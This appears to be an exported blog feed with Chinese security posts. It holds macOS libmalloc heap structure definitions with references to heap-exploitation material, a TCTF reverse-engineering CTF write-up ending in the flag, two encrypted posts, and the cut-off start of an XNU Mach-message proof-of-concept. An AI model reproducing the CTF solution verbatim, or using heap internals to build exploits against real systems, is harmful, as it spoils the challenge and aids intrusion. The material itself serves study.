sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+qLaX5aU3le5FLx8KSuFIYSDgKuWdcfOQr50EhQzlQx1/usMp0Mp3rd6jFaJiiB44QUVlXhwnX6usGcDVtHzgTvL5QoQZdkU6fqTrAvSvKj0UF8hYac2oVggDT0tfQhEfvQTNrLRcR94YEDJbuiaHqUoG5Qt+paDTb1FwBpUX+F3rHJJg1TSfJWj9vmxeIdz3fxpybYnNzkeeF3bCBPnM7LEU1P2KMCuAxsJjndNN5agF2H1zBrUKa1gmx/5h0WJb5PeY5sJ/2ymQobA+BALkRtQZNqyfzqoK2/qG2K5GDtR12YjoL3cvRUXRBk73rqf0dC4NhQ2jD7MI5t+N/82DVyUc78vbrJNVz0nRIL5C4OBQS6BUpqaK9ZjJfXMX1JuFqgKcfbdAtY3D8Qk8mZk898xXDmb3m4cVzk52v1i4QVnlnlkKqQiP19Hzlh7Bw0MBTTqsJ9+iuRO8oqtWBYvPLVOHp3QGACRemcsXCmsopkD9KM97XHV7OWqY9AFP9oGJSuHx1+14LsetN8oaUf5zHGNnr3P0FQ90sK7ZyFesRgdVH0BjMuigydyyX/TlKrvTuY2YiaBQFotlDxD3cM7WWwlRhULJCxK+ojZ64hExwLnRIBT4NHotpRBb2ESvaHbLaK+Q4B7kgYhirjbolOYS8zp5PDcJN+eX9yQEglzyc5k9Q1DW1FH9fhtrGCR6rJ+4HLQyYSDaJ+Sgj4RSfvx5UrI7skM9jonK+OL3GoZw19HDpFX9zYpoCXMSHD3I+babyYtJC/g7OWneDGx5d/iknHtohudfSykcy6mLARqJSz4CidsZ+bdBA3h2ccCgsZiDGgw8HzM/s14Zb1XAHG6w7yB2mZEPfpfYTQRTq918aQ2tuUD7J/Bm1uWIjCxE1MLxYGNJ/LBeFk9XuID20gBf2tiQm6cRzO3/2j4fzZGIoTNbpttOyY/DS5uSsd0ZBixORZwvJKt7utU0pTPkRY0Fx803r6tkgVkMhOJBtVnD496tEMWO1EGaLvgF+I+VJmhMJT/VfpXVDJq4TAcXGSt/QIJGUMz6cP2icwVE7RGdavtjxtj3GfiV+pfUJJBFxUxRt5kLo/jQElRpBMVbom/2WLshNQ0uofTkQHOcI4dyBes3qF6b1udUBhQoWQ/KS3L1UGF4e31gwGgr8LNy5oBlLT+aGYswSyb1yaeWcKuzN0hmDvRXnS/B7tMQ/LVE135/0ATzbJvlRxibQAqeioRWuQlg5NUrtLsWs3nGZtSMJQbd/IEyXEMI7GxMoqtAN/hBqo7J3HH8EB8O4/crwtdhdbBw5Ag+eiN0H1JMwOfhO8dvOvhHdRdcpSytwLwlpFBR3+5/H41nnSFEgriV5Meyt8B/Ke+kCsVvGj4B0rLExICr4k0jPLjlAWNIHVQR0mzfyPC8CklEEp9Roh0qwbE13UMtIUwXyA3zbm3PyYn+v7RjaUGPjkTgjPMUg+TzzvQApBo1PQ37cwF/K10cYxK9lPZpNbjue4qR55AP5bGRWzyiZVI5oXe8e+ZRzchBRKr4l6fol49B3QnK3H4TXF8EEVsWNOvZK8Kba/tvj61rPTIYjSNo5eynxoEBtRWALPhlFV9sdssZDHVFGHH/FGQzo2gqUqLoQGgOfNYz0e0E4sspXxbicYYnfuPPLlqWVesPcLnswU7jlYxIEIkuWPEaZzW8OCIvEyhrq3hKndNC5H5J0+UtUwOrePPZJvIWDHzcQ8W9SlMdIY0JVsO3xhbwKeBjXXViaS8nc02lFYj213UGmv9hDlPclmswhwhO/3zEOmI9dU+gk/r2hsfVD8Tai1zKtUyxDnviF5mwmRzjoPMQ1Kz1X3Qx7cUsxTjwqHdRO9DFe50xIAUpn11dSulce7r2/BKVhBRVVHlf7d9k02ihIWQCfudIxIBv/LhnnRqVbhTGctwV85WyVR0E8kNPe/ur/dlx8nZVbH2XSIbMxKP08BKfQdo5jQmxd24cPJWtL5neIY2+mk0skZ2xtWPRxuei0ff1X+CAh/MYsyexLKvlsWeo2ZffTFp8hiVmuilXzkx2x0GAZq9VsXpuVuiY2ZEAAPqSwgUpy7KWejKu90v5jZ+Sb68zGFcDz8NBR/3qH0FEGEJXfqoktC2zNPD2EN1yM8eXz8WffdFa+zrRfuCUbBYNv2u9iQZrYp+U4z7NnVTUGf7Mv/kR57DdYrT+FhDF+hSAHaDTaiK60cShLHrPlsxTsmIPUwd2y9AVkdnmSavp7WoeoMlVi1AMk/F8O9WYAwRHaSSSU1rDQsthFXQaMok+HLkh6qf5ob7MZ2TJV4STe3J/aLJ8KuqDGK7UK1vBvIge9X8HXVoAJv6L3tmIU6OvmexpBqGDUwR7pcsvxE55Zjq8GDcL96N5tnrpM+F7A1Bv+4pin6+JU9TaujTsqUaikEK28Wozs/HEkl+S0awFnNuCpzIWMkCpVZg+AQWDtR8GBDWNVH8lbHX3FaO7oNqtk+9n5/anDLsXnh5f4KYsegmYP6NcBEEhLH6e6tDCl7kNN7kUROsMFEDioWgxJjdIsCeEYwsYlZ7ktFCf/GwdDK/Q2e1Ui16+a8N+XV5/yRuJL5dQM0Kp94PLQkakNq2RF57UiA2QXgdMWo/0VYwbXKPDjE+IYxCBP2tnp1jlK0bfOhIRRjk3FJuHV/MFoyRR/2vcozUrg6fJgkyUEsCK1fYAJJg==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return 